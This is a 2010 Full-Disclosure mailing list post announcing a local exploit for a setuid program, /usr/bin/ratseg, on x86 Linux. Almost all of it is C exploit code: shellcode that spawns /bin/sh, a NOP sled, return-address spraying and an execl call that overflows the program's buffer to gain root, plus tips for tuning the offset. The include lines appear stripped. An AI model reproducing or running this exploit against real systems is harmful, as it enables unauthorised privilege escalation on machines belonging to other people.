
Date: Thu, 11 Feb 2010 16:40:54 -0500
From: Inda Kitchen <indakitchen@...e.com>
To: <full-disclosure@...ts.grok.org.uk>
Subject: ratseg x86 exploit



Setuid /usr/bin/ratseg has an easy buffer overflow.
exploit is for x86, fails on x64.

later,

IDK

/*
 *
 * /usr/bin/ratseg local exploit, x86.
 *
 * discovered by IDK (indakitchen).
 * try offset 150-250 if sploit fails
 *
 * greets: #hak5,  #remote-exploit
 *
 */

#include
#include

char shellcode[] =
 "\xeb\x48\x9a\xff\xff\xff\xff\x07\xff\xc3\x5e\x31\xc0\x89\x46\xb4"
 "\x88\x46\xb9\x88\x46\x07\x89\x46\x0c\x31\xc0\x50\xb0\x8d\xe8\xdf"
 "\xff\xff\xff\x83\xc4\x04\x31\xc0\x50\xb0\x17\xe8\xd2\xff\xff\xff"
 "\x83\xc4\x04\x31\xc0\x50\x8d\x5e\x08\x53\x8d\x1e\x89\x5e\x08\x53"
 "\xb0\x3b\xe8\xbb\xff\xff\xff\x83\xc4\x0c\xe8\xbb\xff\xff\xff\x2f"
 "\x62\x69\x6e\x2f\x73\x68\xff\xff\xff\xff\xff\xff\xff\xff\xff";

#define BUFSIZE 1100

long get_esp() { __asm__("movl %esp,%eax"); }

int main(int argc, char *argv[]) {

  char buff[BUFSIZE];
  int nopcount=501, offset=260;
  int i;

  if (argc> 1) offset = atoi(argv[1]);
  if (argc> 2) nopcount = atoi(argv[2]);

        memset (buff, 0x90, BUFSIZE);

                for (i = nopcount; i < BUFSIZE - 4; i += 4)
                *(long *) &buff[i] = get_esp() + offset;
        memcpy (buff + (nopcount - strlen (shellcode)), shellcode, strlen
        (shellcode));

            memcpy (buff, ":", 1);
            printf("Addr = 0x%x\n", get_esp() + offset);
         execl("/usr/bin/ratseg", "ratseg", "-r", buff, "-p", "/tmp/rs_data",NULL);
 		 	   		  
_________________________________________________________________
Hotmail: Free, trusted and rich email service.
http://clk.atdmt.com/GBL/go/201469228/direct/01/
_______________________________________________
Full-Disclosure - We believe in it.
Charter: http://lists.grok.org.uk/full-disclosure-charter.html
Hosted and sponsored by Secunia - http://secunia.com/
